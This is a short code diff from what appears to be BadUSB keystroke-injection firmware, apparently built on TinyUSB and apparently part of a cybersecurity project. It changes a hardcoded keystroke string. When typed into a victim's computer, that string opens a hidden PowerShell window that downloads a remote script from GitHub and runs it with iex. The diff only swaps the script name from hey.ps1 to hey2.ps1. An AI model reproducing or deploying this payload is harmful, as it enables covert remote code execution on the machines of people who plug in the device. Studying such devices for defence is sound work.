@@ -104,8 +104,8 @@ void tud_resume_cb(void)
 //--------------------------------------------------------------------+
 // USB HID
 //--------------------------------------------------------------------+
-const char* inputs = "~r~powershel~l -w h iwr 'ht~tps:/~/raw.githubusercontent.com/map32/cybersecurity-badusb/main/hey.ps1' | iex\n";
-const int inputs_len = 109;
+const char* inputs = "~r~powershel~l -w h iwr 'ht~tps:/~/raw.githubusercontent.com/map32/cybersecurity-badusb/main/hey2.ps1' | iex\n";
+const int inputs_len = 110;
 uint8_t char_to_hid_code (uint8_t c) {
   if (c >= 'A' && c <= 'Z') return c - 'A' + HID_KEY_A;
   else if (c >= 'a' && c <= 'z') return c - 'a' + HID_KEY_A;
